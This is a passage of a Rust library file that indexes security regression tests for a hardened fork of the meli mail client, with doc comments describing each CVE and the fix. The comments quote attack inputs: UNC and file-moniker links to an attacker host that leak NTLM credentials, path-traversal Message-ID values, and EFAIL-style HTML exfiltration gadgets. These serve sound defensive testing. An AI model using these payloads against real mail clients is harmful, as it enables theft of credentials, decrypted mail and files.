/*
 * cve - lib.rs
 *
 * Copyright 2026 Kyle Lee
 *
 * SPDX-License-Identifier: EUPL-1.2 OR GPL-3.0-or-later
 */

//! Security CVE workspace of the hardened-meli fork.
//!
//! This crate is the scaffolding for CVE-driven regression tests that target
//! the `meli` and `melib` crates without adding test-only dependencies to
//! the shipped binaries. Every regression follows one pattern: a CVE (or a
//! CVE family), its verbatim attack payload as a fixture, and an inertness
//! or round-trip assertion against the hardened code path — see for example
//! the CVE-2025-66376 tag-splitting corpus that already locks down meli's
//! built-in HTML sanitizer from the `meli` crate.
//!
//! The source-verified research reports live next to this crate:
//!
//! - [SECURITY-CVE-RESEARCH.md](../SECURITY-CVE-RESEARCH.md) — survey of
//!   CVEs delivered through e-mail or directly attacking mail clients and
//!   their rendering path (tracking/privacy, malware/code execution,
//!   web/HTML embedding, e-mail-reachable browser engines, protocol and
//!   crypto trust boundaries);
//! - [SECURITY-CVE-RESEARCH.zh-CN.md](../SECURITY-CVE-RESEARCH.zh-CN.md) —
//!   its Simplified Chinese counterpart.
//!
//! New regressions go into test files under `src/` (unit) or `tests/`
//! (integration); run everything with `cargo test -p cve`.
//!
//! First in-crate regression: MFSA-2005-11 (issue #13), the Thunderbird
//! cookie-tracking advisory — [`mfsa_2005_11`] locks the sanitize →
//! html2text pipeline's immunity against cookie-beacon mail.
//! CVE-2005-2512 (issue #14) extends the corpus approach to the second
//! renders Mail.app leaked on — [`cve_2005_2512`] proves reply-quote,
//! pipe/print, forward and export paths never relax remote-content
//! stripping.
//!
//! CVE-2006-1045 (issue #15) attacks the reference-form side of the
//! same invariant: Thunderbird's "block remote images" preference
//! was bypassed by reference forms it did not classify —
//! [`cve_2006_1045`] proves every form (`<img src>`/`srcset`, CSS
//! `background:url()`, `@import`, `<video poster>`, `<source src>` and
//! relatives) dies in `sanitize` in every embedding context.
//!
//! CVE-2008-3068 (issue #16) moves from the rendering path to the
//! crypto trust boundary: Outlook's CryptoAPI dereferenced AIA/CRL
//! URLs embedded in an S/MIME certificate during revocation checking,
//! turning every mail read into an encrypted-receipt beacon.
//! [`cve_2008_3068`] proves meli's equivalent surface immune with a
//! genuinely signed corpus: the CMS part stays an opaque
//! `CMSSignature` blob, the PGP verification gate never dispatches
//! S/MIME to an engine, and every gpgme context is born offline,
//! local-only and non-retrieving — so no certificate-borne URL can
//! ever be fetched.

//! CVE-2008-4491 (issue #17) turns to the draft store: Apple Mail kept
//! drafts of S/MIME-encrypted mail as plaintext on the server.
//! [`cve_2008_4491`] maps the attack onto meli's composer draft
//! lifecycle with a genuine gpg-encrypted PGP/MIME corpus: the wire
//! form and melib parsing surface no session plaintext, quoting the
//! decrypted view is exactly what serializes it — and the composer's
//! save policy (no auto-save, no silent plaintext persistence of an
//! encryption-armed draft, warnings on explicit saves, encrypted
//! post-submission copies) is what keeps those bytes off the server.
//!
//! CVE-2017-17688 (issue #18) is the EFAIL chapter: OpenPGP CFB
//! malleability grafts an HTML exfiltration gadget onto decrypted
//! plaintext. [`cve_2017_17688`] proves the gadget corpus genuine (real
//! gpg ciphertext, real bit-flip variants, real tampered-decryption
//! outputs) and locks meli's walls: the gadget dies in `sanitize`
//! before rendering, parts never splice, and decryption failure
//! surfaces no plaintext — closing the CLI backend's stdout-echo gap
//! the issue exposed.

/// MFSA-2005-11 (Thunderbird 0.6–0.9 / Mozilla Suite 1.7–1.7.3)
/// cookie-tracking regression (issue #13): an HTML-mail beacon corpus
/// proving the render pipeline performs no remote reference loading —
/// every auto-load vector loses tag and URL in `sanitize`, and the
/// rendered mail is plain terminal text whose only remote references are
/// user-facing link footnotes meli never fetches.
#[cfg(test)]
#[path = "MFSA-2005-11.rs"]
mod mfsa_2005_11;

/// CVE-2005-2512 (Apple Mail.app ≤ 10.4.2) tracking-pixel regression
/// (issue #14): Mail.app fetched remote images when printing or
/// forwarding HTML mail, ignoring the "don't load remote images"
/// preference. This corpus proves meli's equivalent surfaces immune:
/// there is exactly one HTML display pipeline (sanitize → html2text,
/// no fetcher), every second render (reply-quote, pipe/print, forward,
/// export, nested .eml view) reuses or re-enters it with the same
/// strength, and no operation type relaxes beacon stripping.
#[cfg(test)]
#[path = "CVE-2005-2512.rs"]
mod cve_2005_2512;

/// The single per-crate lock serializing every test that rewrites the
/// process-global `GNUPGHOME` (the workspace rule for environment-mutating
/// tests). The crypto filters instantiate their own gpgme context, which
/// resolves the scratch keyring through this environment variable; without a
/// shared lock, two parallel tests would point each other at the wrong home
/// and fail with "No secret key found". CVE-2014-8878, CVE-2017-9604,
/// CVE-2021-29956 and CVE-2024-49395 all acquire it.
#[cfg(test)]
pub(crate) static GNUPGHOME_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// CVE-2006-1045 (Mozilla Thunderbird 1.5) tracking-pixel regression
/// (issue #15): the "block remote images in HTML mail" preference was
/// bypassed and externally linked resources loaded anyway. This corpus
/// proves meli's equivalent surface immune: remote-content stripping is
/// unconditional — every reference form (`<img src>`/`srcset`, CSS
/// `background:url()`, `@import`, `<video poster>`, `<source src>` and
/// era relatives) dies in `sanitize` in every embedding context, and
/// the rendered text keeps only the manual unsubscribe footnote.
#[cfg(test)]
#[path = "CVE-2006-1045.rs"]
mod cve_2006_1045;

/// CVE-2008-3068 (Outlook, Windows Live Mail, Office 2007 CryptoAPI)
/// encrypted-receipt beacon regression (issue #16): an S/MIME mail
/// whose embedded certificate carries attacker AIA/CRL-distribution-
/// point URLs; the victim's client fetched them automatically during
/// CRL revocation checking, leaking read time and IP. The corpus is a
/// genuinely valid openssl-signed S/MIME mail, and the regression
/// proves the equivalent meli surface immune layer by layer: the CMS
/// part parses as an opaque blob whose URLs surface nowhere in mail
/// metadata, the only signature-verification gate rejects non-OpenPGP
/// protocols (and a smuggled carrier still hands the engine opaque
/// bytes only), and every production gpgme context is created offline
/// with local-only key location — per the GPGME manual, offline mode
/// bars Dirmngr's CRL/OCSP validation for CMS and disables Dirmngr
/// entirely for OpenPGP, so no certificate-borne URL is ever
/// dereferenced.
#[cfg(test)]
#[path = "CVE-2008-3068.rs"]
mod cve_2008_3068;

/// CVE-2008-4491 (Apple Mail.app 3.5) plaintext-draft-at-rest regression
/// (issue #17): with "store drafts on server" enabled, drafts of
/// S/MIME-encrypted mail were saved as plaintext on the server, readable
/// by the server operator and intermediaries. This corpus maps the
/// attack onto meli's composer draft lifecycle: a genuine gpg-encrypted
/// PGP/MIME mail whose secrets exist only off the wire; parsing and
/// reply-quoting of the stored form leak nothing; quoting the decrypted
/// session view is what produces the plaintext draft — and the tests
/// document that the bar keeping it off a server-side Drafts mailbox is
/// the composer save policy (no auto-save, submission-setup failures
/// refuse to persist encryption-armed drafts, explicit saves warn,
/// post-submission copies are the encrypted wire form), locked by the
/// meli regressions named in the module docs.
#[cfg(test)]
#[path = "CVE-2008-4491.rs"]
mod cve_2008_4491;

/// CVE-2017-17688 (EFAIL, OpenPGP variant; 11 clients incl. Apple Mail,
/// Thunderbird, Outlook) CFB-malleability exfiltration regression
/// (issue #18): an attacker flips one ciphertext block of an
/// intercepted PGP/MIME mail so the decrypted plaintext opens an
/// unclosed `<img src="https:` gadget whose URL tail is the
/// confidential remainder — and a client that renders it (or echoes it
/// in a decryption error) exfiltrates the plaintext. The corpus is a
/// genuine gpg-encrypted mail plus its two bit-flipped variants (real
/// `gpg --ignore-mdc-error` outputs embedded), and the regression locks
/// the walls layer by layer: the wire carries no plaintext, the
/// tampering is pure CFB XOR, the decrypted gadget dies in `sanitize`
/// before rendering (no fetcher exists to begin with), no code path
/// splices decrypted bytes with attacker-controlled outer parts, and
/// decryption failure surfaces no plaintext fragment — the gap this
/// issue closed: the CLI backend's error used to embed the failing
/// decrypt script's captured stdout byte-for-byte, which GnuPG fills
/// with literal data *before* the MDC verdict.
#[cfg(test)]
#[path = "CVE-2017-17688.rs"]
mod cve_2017_17688;

/// CVE-2017-17689 (EFAIL, S/MIME variant; 11 clients incl. Apple Mail,
/// Thunderbird, Outlook) CBC-malleability exfiltration regression
/// (issue #19): an attacker XORs the IV of an intercepted
/// `application/pkcs7-mime` enveloped-data mail so the first decrypted
/// block becomes an unclosed `<img src="https:` gadget whose URL tail
/// is the confidential remainder — CBC has no integrity check, so the
/// whole tail still decrypts to the original bytes and the decrypting
/// client (or its renderer) exfiltrates the plaintext. The corpus is a
/// genuine openssl S/MIME envelope (AES-128-CBC) plus its IV-flipped
/// variants (real `openssl smime -decrypt` outputs embedded), and the
/// regression locks the walls layer by layer, complementing
/// [`cve_2017_17688`]'s CFB corpus: the wire carries no plaintext,
/// the tampering is a pure 16-byte IV XOR with no damage trail, meli's
/// decrypt entry refuses the single-part S/MIME carrier before any
/// engine is consulted, a smuggled `multipart/encrypted` carrier that
/// does reach an engine fails without leaking plaintext through
/// either real backend, the gadget dies in `sanitize` before
/// rendering, and the direct-exfiltration decoy can never splice with
/// decrypted bytes.
#[cfg(test)]
#[path = "CVE-2017-17689.rs"]
mod cve_2017_17689;

/// CVE-2026-0818 (Thunderbird < 147.0.1, ESR < 140.7.1; MFSA
/// 2026-07/08) CSS-exfiltration regression (issue #20): an HTML+CSS
/// mail wraps an inline OpenPGP block in a stylesheet of extraction
/// oracles — attribute-prefix selectors, `@font-face`
/// `unicode-range` font probes and a `@keyframes`/`steps()` timing
/// probe — and a client that decrypts in place renders the decrypted
/// content *inside the attacker document's CSS context*, leaking the
/// secret one fetch (or one timed tick) per character. The corpus is
/// a genuine gpg-encrypted inline-PGP mail (real cv25519 armor,
/// CRC-24-verified in-test, decrypt-verified round-trip to the
/// embedded plaintext) in both delivery forms — the advisory's
/// `multipart/alternative` (armor mid-prose, never dispatching in
/// meli) and the strongest dispatchable `multipart/mixed` (armor-only
/// part, whose decrypt output re-enters as its own attachment) — and
/// the regression locks the walls layer by layer: the wire carries no
/// plaintext, the whole kit (`<style>`, `style=`, `<link>`, `<font>`,
/// every marker) dies in `sanitize` in every embedding context, the
/// decrypted view renders through its own `sanitize` with the secret
/// delivered but zero probe references, and even the Thunderbird
/// splice (outer kit document concatenated with decrypted HTML, both
/// orders) sanitizes to an inert fixed point — meli's terminal-text
/// pipeline has no CSS engine to inherit from at all.
#[cfg(test)]
#[path = "CVE-2026-0818.rs"]
mod cve_2026_0818;

/// CVE-2018-0950 (Microsoft Office Word / RTF OLE preview on Windows,
/// CVSS 6.5) remote-content information-disclosure regression (issue
/// #101, table 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — web/HTML
/// embedding): opening or previewing a mail whose RTF attachment
/// embeds an OLE preview object
/// (`\object\objemb{\*\objclass Word.Document.8}{\*\objdata …}`)
/// pointed at `\\attacker.example\share` made Office render remote
/// content and leak information (NTLM credentials / host info) with no
/// click on the object. meli embeds no RTF/OLE previewer, so
/// [`cve_2018_0950`] maps the issue's equivalent surfaces layer by
/// layer: the `application/rtf` part parses as an opaque
/// `ContentType::Other{tag:"application/rtf"}` attachment that only the
/// explicit `open_mailcap` / `open_attachment` user action can
/// materialize, the HTML mirror's `file:`/UNC/`<img src>`/`srcset`/CSS
/// `background:url()`/`@import` family dies in `sanitize` in every
/// embedding context, and the launch gate refuses the whole
/// `file:`/`smb:`/UNC/drive-path family while honest
/// http/https/mailto links stay usable. The recon exposed one real
/// gap, fixed with this regression: a bare UNC `href` has no WHATWG
/// scheme, so ammonia's `url_relative = PassThrough` kept it and the
/// `attribute_filter` trim early-return skipped its `is_safe_url`
/// re-validation — the sanitized output carried a live
/// `\\host\share` href that html2text rendered as an outbound link
/// footnote (the terminal mirror of Office's automatic dereference).
/// The fix rejects every Windows-path-shaped relative value and
/// validates `href` before the trim early-return, regression-locked in
/// `meli/src/mail/view/html_render.rs` together with the corpus here.
#[cfg(test)]
#[path = "CVE-2018-0950.rs"]
mod cve_2018_0950;

/// CVE-2023-23397 (Microsoft Outlook on Windows, CVSS 9.8, CISA KEV,
/// APT28) zero-click credential-theft regression (issue #21, table 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious `text/calendar` meeting invite sets the reminder sound
/// (`VALARM` `ATTACH;VALUE=URI`, MAPI `PidLidReminderFileParameter`)
/// to a Windows UNC path `\\attacker.example\share\a.wav`, and
/// Outlook dereferenced it at reminder time with no user interaction,
/// authenticating to the attacker's SMB server with the victim's NTLM
/// credentials. meli has no MAPI store, no reminder subsystem and no
/// SMB client, so the equivalent surfaces — every place
/// mail-controlled bytes can become an "openable link" the OS url
/// launcher dispatches — are mapped and locked: the calendar part
/// renders through the plain-text `InlineText` branch with no
/// iCalendar interpretation, the pager's linkify extraction cannot
/// carry the UNC's backslash tail (and every `file:`/`smb:` URL it
/// does surface is held behind the `go_to_url` confirmation gate),
/// the HTML mirror's scheme-bearing hrefs die in `sanitize`, and —
/// the real gap this issue exposed — the two mail-header-derived
/// launcher sites (`List-Unsubscribe` URL options, `List-Archive`)
/// that used to hand attacker-controlled header bytes straight to
/// `Command::new(url_launcher)` now enforce the same http/https/
/// mailto whitelist, fixed and regression-locked together with the
/// corpus in `meli/src/mail/view.rs` / `meli/src/mail/view/tests.rs`.
#[cfg(test)]
#[path = "CVE-2023-23397.rs"]
mod cve_2023_23397;

/// CVE-2024-21413 (Microsoft Outlook on Windows, CVSS 9.8, public PoC,
/// exploited in the wild) MonikerLink regression (issue #22, table 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// `file://` URL whose `!`-suffix makes Outlook resolve it as a COM
/// moniker (`file://attacker.example/share/leak.html!Exploit`, with
/// `file:\\`, `search-ms:` and `mhtml:` variants), embedded as a link
/// in the mail body — clicking it bypassed Protected View and made
/// the client dereference the attacker's share over SMB/WebDAV with
/// the victim's NTLM credentials. meli has no Protected View, no COM
/// moniker resolver and no SMB/NTLM client, so the equivalent
/// surfaces — every place a mail-borne link spelling can reach the OS
/// url launcher — are mapped and locked as an immunity proof: the
/// `go_to_url` gate holds the whole moniker family (`file:`, with or
/// without the `!` suffix, `mhtml:`, `search-ms:`, application
/// monikers, UNC, every casing) behind an explicit per-URL
/// confirmation, URL-mode extraction never yields a launchable
/// moniker (the one documented nuance — an `mhtml:https://…` prefix
/// is consumed by extraction, leaving a plain https link
/// byte-identical to what any mail may carry by design — is locked
/// with its mapping rationale), the HTML mirror's scheme-bearing
/// hrefs die in `sanitize`, and the issue #21 header-derived launch
/// sites skip `mhtml:`/`search-ms:`/`file:` options on the same
/// whitelist. No gap was exposed on this corpus; no production code
/// needed changing.
#[cfg(test)]
#[path = "CVE-2024-21413.rs"]
mod cve_2024_21413;

/// CVE-2024-21378 (Microsoft Outlook on Windows, CVSS 8.8, February
/// 2024 Patch Tuesday) open-mail remote-code-execution regression
/// (issue #23, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus /
/// code execution): processing a crafted message corrupted Outlook
/// memory. meli links no MAPI store, COM runtime or scripting engine,
/// so the equivalent surface is the whole 「receive → parse →
/// display」 path as a class-level memory-safety regression:
/// [`cve_2024_21378`] drives a malformed-MIME corpus (boundary
/// delimiters that used to spin or slice out of bounds, broken
/// base64/quoted-printable/RFC 2047/charset decoding, unexpected
/// nesting combinations) through envelope parsing, tree building,
/// every decode/display conversion and the HTML pipeline with zero
/// panics — and exposes one real gap, fixed with this regression:
/// meli's open-mail display recursion over nested `message/rfc822`
/// (`EnvelopeView::attachment_to_display_helper` and
/// `ViewFilter::new_attachment`) was unbounded, and a mail a few KiB
/// long nested a few thousand levels deep stack-overflowed the 2 MiB
/// view/filter threads the moment it was opened (CWE-674); the fix
/// caps the recursion at `MAX_RFC822_DISPLAY_NESTING_DEPTH`,
/// regression-locked in `meli/src/mail/view/tests.rs` together with
/// the corpus here.
#[cfg(test)]
#[path = "CVE-2024-21378.rs"]
mod cve_2024_21378;

/// CVE-2024-30103 (Microsoft Outlook on Windows, CVSS 8.8, June 2024
/// Patch Tuesday, discovered by Morphisec) crafted-message RCE
/// regression (issue #24, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// processing a specially crafted e-mail executed code because a
/// parsing path filtered attacker input incompletely (CWE-184). meli
/// links no MAPI store, no Outlook Forms engine and no scripting
/// host, so the equivalent surface the issue prescribes is the
/// header parsing path (`melib/src/email/headers.rs` +
/// `melib/src/email/parser.rs`): overlong header values, malformed
/// parameter lists and abnormal encoding combinations must parse
/// with bounded time and memory — no panic, no whole-value expansion
/// allocation. [`cve_2024_30103`] locks that layer by layer and
/// exposes one real gap, fixed with this regression: `phrase()`
/// rescanned for the next `=?` encoded-word opener from every token,
/// so a header value of many whitespace-separated tokens closed by a
/// lone `=?` sentinel was quadratic (CWE-407) — 64 KiB stalled every
/// header's decode for ~17 s and 256 KiB for minutes, an open-mail
/// denial of service through `Subject`, custom headers, display
/// names, attachment names and IMAP envelope strings alike. The fix
/// caches the next opener position so the scan is one forward pass —
/// the width-side sibling of the CVE-2024-21378 depth caps: those
/// bound recursion depth, this bounds rescan width, and they compose
/// without overlap.
#[cfg(test)]
#[path = "CVE-2024-30103.rs"]
mod cve_2024_30103;

/// CVE-2025-21361 (Microsoft Outlook Office/LTSC/M365 apps, macOS
/// included, CVSS 7.8, January 2025 Patch Tuesday) open-mail RCE
/// regression (issue #25, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// network attacker could execute code in the client through
/// malicious input; MSRC did not disclose the primitive. meli links
/// no MAPI store, COM runtime, forms engine or scripting host, so
/// the equivalent surface the issue prescribes is
/// `melib/src/email/parser` under a 「多形态畸形 MIME/头/附件组合」
/// corpus — and scoped past what #23 (MIME tree/boundary/encoding
/// shapes, display depth cap) and #24 (value width, token-rescan
/// linearity) already locked: the *header-value grammars* under
/// combination. [`cve_2025_21361`] drives the address grammar
/// (groups, nested comments, quoted display names, domain literals,
/// obs routes, the regex error-recovery fallback), the date grammar
/// (obs zones and years, leap seconds, encoded-word dates, the mbox
/// fallback), the message-id grammar, RFC 2231 segmented attachment
/// names, RFC 2369 list headers and RFC 6068 mailto URIs, alone and
/// stacked in kitchen-sink combination mails through the whole
/// 「receive → parse → display」 pipeline — and exposes one real gap,
/// fixed with this regression: `no_fold_literal` returned its
/// `[dtext]` span one byte short of the closing `]`, so every
/// domain-literal `Message-ID` was stored, keyed and displayed one
/// byte truncated (`<a@[127.0.0.1` — CWE-193, the incomplete-
/// filtering face of the CVE family; checked slicing kept it
/// memory-safe, but threading silently split on literal-form ids).
/// The fix returns the whole literal, regression-locked in
/// `melib/src/email/parser/tests.rs::test_email_parser_msg_id`
/// together with the corpus here. The one measured nuance, kept as
/// documentation: a nested comment pays a *linear* ~56× alternation
/// re-parse constant (every `alt` branch of the address grammar
/// re-enters `opt(cfws())` from the same prefix — 200 KB of nested
/// parens ≈ 0.7 s release), two orders below the quadratic faces
/// #23/#24 closed and with no re-scan width to cache.
#[cfg(test)]
#[path = "CVE-2025-21361.rs"]
mod cve_2025_21361;
/// CVE-2025-47176 (Microsoft Office Outlook, M365 Apps for Enterprise
/// / Office LTSC 2024, June 2025 Patch Tuesday) path-traversal RCE
/// regression (issue #26, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// `'.../...//' in Microsoft Office Outlook allows an authorized
/// attacker to execute code locally` (CWE-35/CWE-22, CVSS 3.1 7.8).
/// meli links no MAPI store and no Windows path normalization, so the
/// equivalent surfaces are the issue-prescribed 「open mail parses
/// it」 class (`melib/src/email/parser.rs` +
/// `melib/src/email/attachments.rs`: malformed structure and extreme
/// sizes must parse without panics, bounded, with deterministic
/// errors) plus the advisory's own face: every path a mail-controlled
/// identifier (attachment `filename`/`name`, raw `Message-ID`) can
/// reach the filesystem. [`cve_2025_47176`] locks both, and exposes
/// two real gaps, fixed with this regression: the whole-mail export
/// sites (`save-attachment 0 <dir>` and `export-thread`) pushed the
/// raw `Message-ID` into the export directory with no sanitization,
/// so a mail with `Message-ID: ../evil` wrote outside the directory
/// the user chose — and `sanitize_separator` stripped only the
/// host's native separator, leaving the other spelling alive on the
/// other platform family. The exports now run the header bytes
/// through `sanitize_filename` (regression-locked in
/// `meli/src/mail/view/tests.rs`), and the separator sanitizer
/// strips both separators everywhere.
#[cfg(test)]
#[path = "CVE-2025-47176.rs"]
mod cve_2025_47176;

/// CVE-2026-70329 (Microsoft Outlook, Office 2019/2021/M365, CVSS
/// 8.8) integer-overflow RCE regression (issue #27, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// integer wraparound on an attacker-declared size delivered over
/// the network vector corrupted Outlook memory and executed code
/// (CWE-190). meli links no MAPI store and none of Outlook's
/// Windows protocol machinery, so the equivalent surfaces the issue
/// prescribes are every place meli computes a length from a
/// *declared* size — IMAP literal declarations (`{4294967295}`) in
/// `melib/src/imap/protocol_parser.rs`, the mbox `Content-Length`
/// header in `melib/src/mbox/mod.rs`, and multipart boundary offset
/// arithmetic in `melib/src/email/parser.rs` — and the invariant is
/// checked semantics throughout: no wraparound, oversized
/// declarations rejected or clamped, never trusted for a slice, a
/// skip or an allocation. [`cve_2026_70329`] locks that layer by
/// layer and exposes four real bugs across the declared-size
/// surfaces, all fixed with this regression: the IMAP line splitter
/// skipped literal continuation lines with unchecked `i += pos + 2
/// + len` on the server-declared length — a
/// `{18446744073709551615}` declaration overflowed it (CWE-190),
/// panicking debug builds of every IMAP session and wrapping
/// release builds past the buffer; the fix saturates the skip. The
/// `mboxcl`/`mboxcl2` reader cut each message with
/// `&input[..headers_end + bytes]` on the header-declared length —
/// a near-`usize::MAX` declaration overflowed the addition and a
/// merely-larger-than-the-file declaration indexed out of bounds
/// directly (CWE-190/CWE-125): one crafted line crashed the reader;
/// the fix computes the message end with `checked_add` and clamps
/// it to what is actually present. And the same reader's
/// `find_content_length` never worked at all: it handed
/// `header_value` the slice starting at the field name — so the
/// parsed "value" was the whole header line and every
/// `usize::from_str` failed — and `headers_end` stripped the line
/// terminator off a final `Content-Length` header, the position
/// the built-in mboxcl2 writer always writes it to; both fixed, so
/// the honest writer→reader round-trip passes for the first time.
/// The IMAP literal parser itself and the boundary scanner's
/// guarded bookkeeping are proven immune on the same corpus.
#[cfg(test)]
#[path = "CVE-2026-70329.rs"]
mod cve_2026_70329;

/// CVE-2006-1305 (Microsoft Outlook 2000/2002/2003, no CVSS score
/// assigned) parsing-DoS regression (issue #30, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution family,
/// DoS face): a remote attacker's malformed headers — an oversized
/// `Subject` and a mass of `To`/`Cc` recipients — exhausted Outlook's
/// memory and interrupted e-mail recovery (CWE-400). meli links none
/// of Outlook's PST/MAPI machinery, so the equivalent surface is the
/// issue-prescribed header path (`melib/src/email/headers.rs`, the
/// `headers` module of `melib/src/email/parser.rs` and
/// `Envelope::populate_headers`), and the invariant reads in meli's
/// memory model as *no amplification*: the mail is already in memory
/// when parsing starts, so a header can only exhaust memory by
/// expanding past its encoded form, re-scanning earlier bytes per
/// token, or compounding per-header work. [`cve_2006_1305`] locks
/// that layer by layer — MB-level subjects (plain, folded,
/// invalid-UTF-8 lossy, 32 768 valid encoded words, 1 MiB of
/// unterminated `=?charset?encoding?` prefixes), ten-thousand-strong
/// recipient storms (interleaved headers, one 10 000-address list,
/// one 10 000-member group), a hundred-thousand custom-header storm,
/// and the combined mail with its recovery pass (`Draft::new_reply`,
/// the meli face of Outlook's interrupted e-mail recovery) — and the
/// result is **immune, no gap found**: every layer parses linear in
/// time and memory, the malformed-prefix subject degrades to a
/// dropped subject instead of a stall, and the honest carrier proves
/// the budgets come from linearity, not truncation. The corpus
/// composes with #24 (CVE-2024-30103): the malformed-prefix subject
/// re-locks that issue's `phrase()` rescan-cache fix at this CVE's
/// own MB scale.
#[cfg(test)]
#[path = "CVE-2006-1305.rs"]
mod cve_2006_1305;

/// CVE-2020-9818 (Apple iOS Mail, iOS 12–13.4.1, no CVSS assigned)
/// zero-click out-of-bounds write regression (issue #31, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malformed e-mail corrupted iOS Mail's memory the moment the
/// background fetch received it — no tap, no open (ZecOps; exploited
/// in the wild since at least 2018 per their report, unconfirmed by
/// Apple). meli links no MFMessage framework and no Objective-C heap,
/// so the equivalent surface is the issue-prescribed zero-interaction
/// 「receive → parse」 path: IMAP FETCH responses
/// (`melib/src/imap/protocol_parser.rs`) plus the mail bytes they
/// carry (`melib/src/email/parser.rs`). [`cve_2020_9818`] locks that
/// layer by layer and exposes one real gap, fixed with this
/// regression: the `FLAGS`/`MODSEQ` branches advanced the scan cursor
/// with a `+ 1` that skips the list-closing `)` — on a response
/// truncated right after the flags list or the MODSEQ digits there
/// was no `)` left, the cursor overshot `input.len()` and the
/// `raw_fetch_value` slice panicked with an out-of-range end index
/// (CWE-125, the contained face of this CVE's write class): five
/// one-line server bytes crashed every IMAP account's unsolicited
/// fetch. The cursor now clamps at the buffer end, and the `flags()`
/// token scan terminates at CR/LF (an IMAP atom never contains them)
/// so a line-cut `\Seen` degrades to the real flag. The corpus also
/// re-locks the neighboring walls at the IMAP framing: malformed
/// frames (truncated literals, bare prefixes, past-`usize` digit
/// runs, truncated ENVELOPE, 500-deep BODYSTRUCTURE) reject or
/// saturate cleanly, the malformed-MIME mail corpus (truncated,
/// nested, illegal UTF-8, boundary bytes, NUL, bare CR/LF, broken
/// base64, kitchen sink, 5000-level nesting) parses zero-click with
/// no panic through envelope and MIME tree, and hostile
/// illegal-UTF-8 ENVELOPE literals flow through the tolerance layers
/// to a lossy-decoded envelope.
#[cfg(test)]
#[path = "CVE-2020-9818.rs"]
mod cve_2020_9818;

/// CVE-2006-2386 (Microsoft Outlook Express ≤ 6, CVSS 2.0 6.8,
/// MS06-076) address-book contact-record RCE regression (issue #29,
/// table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): a crafted contact record in a mail-distributed Windows
/// Address Book (WAB) file executed code in Outlook Express'
/// address book parser. meli links no WAB engine, so the equivalent
/// surfaces the issue prescribes are meli's address book as a class:
/// the vobject vCard parser (`melib/src/utils/vobject`), the
/// production contacts load path (`vcard_folder` → `load_cards` →
/// `CardDeserializer` → `Card`) and the mail-carriage layer that
/// keeps `.vcf`/`.wab` attachments inert. [`cve_2006_2386`] locks
/// malformed contact entries — overlong fields, deep structures,
/// binary garbage — panic-free, bounded and deterministically
/// rejected on all three, and exposes two real gaps fixed with this
/// regression: one binary-garbage `.vcf` in the `vcard_folder` used
/// to abort the whole address book load and blank every contact
/// (CWE-754, now quarantined per file), and multi-card `.vcf` streams
/// loaded only their first contact (RFC 6350 streams, now complete).
#[cfg(test)]
#[path = "CVE-2006-2386.rs"]
mod cve_2006_2386;

/// CVE-2024-43604 (Microsoft Outlook for Android, CVSS 5.7, October
/// 2024 Patch Tuesday) local privilege-escalation regression (issue
/// #28, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): the Android attachment-path family — mail-controlled
/// attachment filenames carrying path elements out of the directory
/// the app assumed was fixed, planting files with the app's
/// privileges. meli runs on no Android sandbox, so the equivalent
/// surface — every place mail-controlled bytes become an on-disk path
/// component — is mapped and locked: the single/batch attachment
/// saves and the mbox export defaults sanitized only `/` away
/// (control characters, backslashes and `.`/`..` survived), and the
/// `.eml` export names derived from the attacker-authored
/// `Message-ID` reached `PathBuf::push` with **no sanitization at
/// all** — `save-attachment 0 <dir>` on `Message-ID:
/// <../../evil>` wrote outside the destination and an absolute
/// `Message-ID` replaced it outright, an arbitrary-file plant with
/// the user's privileges (the direct equivalent of the CVE's
/// escalation); meli's own forward-as-attachment was even capable of
/// *mailing out* such filenames. [`cve_2024_43604`] carries the
/// payload corpus (relative chains, absolute paths, RFC 2047-armored
/// traversals decoded by `Attachment::filename` before any sink sees
/// them, backslash chains, ANSI control names, the bare `..`) and
/// locks the walls: every sink now routes through
/// `sanitize_filename_component`/`eml_filename` (flat names,
/// generated fallbacks), the mailcap `%s` temp landing stays
/// sanitized under the meli temp root with degenerate hints guarded,
/// and every write stays `create_new` + `0o600` — regression-locked
/// end to end in `meli/src/mail/view/tests.rs`,
/// `meli/src/mailcap.rs` and `meli/src/types/helpers.rs`.
#[cfg(test)]
#[path = "CVE-2024-43604.rs"]
mod cve_2024_43604;

/// CVE-2006-6505 (Mozilla Thunderbird ≤ 1.5.0.8 / SeaMonkey ≤ 1.0.6,
/// MFSA 2006-74, Critical) mail-header heap-overflow RCE regression
/// (issue #34, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// virus / code execution): processing an external message body
/// whose overlong `Content-Type` header and overlong RFC 2047
/// encoded-word headers overflowed a fixed heap buffer and ran
/// attacker code. meli's RFC 2047 decoder is safe Rust, so
/// [`cve_2006_6505`] locks the equivalent walls the issue
/// prescribes on `melib/src/email/parser`: oversized encoded words
/// (100 KiB–1 MiB B/Q words, charset-converting words, 20k-word
/// chains) decode to output bounded by a small multiple of input in
/// linear time (the CVE-2024-30103 `phrase()` linearity rework
/// re-locked), malformed words (truncated, oversized charset tag,
/// bad base64, bogus transfer encoding) degrade deterministically
/// without panicking, the oversized `Content-Type` carrier parses
/// with every parameter byte-identical (no cross-parameter
/// corruption — the overflow's observable face), and the
/// external-body URL stays inert text: the part is an opaque
/// `Other` leaf whose `decode()` yields only the local body bytes —
/// meli has no external-body fetcher (its only HTTP client is the
/// user-configured JMAP backend; patch retrieval is an explicit
/// user command). An immunity proof: no meli/melib gap was found
/// on this surface.
#[cfg(test)]
#[path = "CVE-2006-6505.rs"]
mod cve_2006_6505;

/// CVE-2020-9819 (iOS Mail, iOS 12–13.4.1) heap-corruption / DoS
/// regression (issue #32, table 2 of
